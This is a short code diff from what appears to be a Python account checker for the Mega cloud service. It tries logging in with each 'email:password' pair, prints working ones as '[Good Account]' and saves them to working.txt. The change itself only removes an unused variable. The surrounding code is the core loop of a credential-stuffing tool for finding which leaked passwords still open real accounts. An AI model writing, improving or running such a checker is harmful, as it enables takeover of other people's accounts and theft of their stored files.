@@ -8,7 +8,7 @@ mega = Mega()
 def checkAccount(account):
     global mega
     try:
-        m = mega.login(account.split(':')[0], account.split(':')[1])
+        mega.login(account.split(':')[0], account.split(':')[1])
         print("[Good Account] " + account)
         workingfile = open("working.txt", "a")
         workingfile.write(account + "\n")
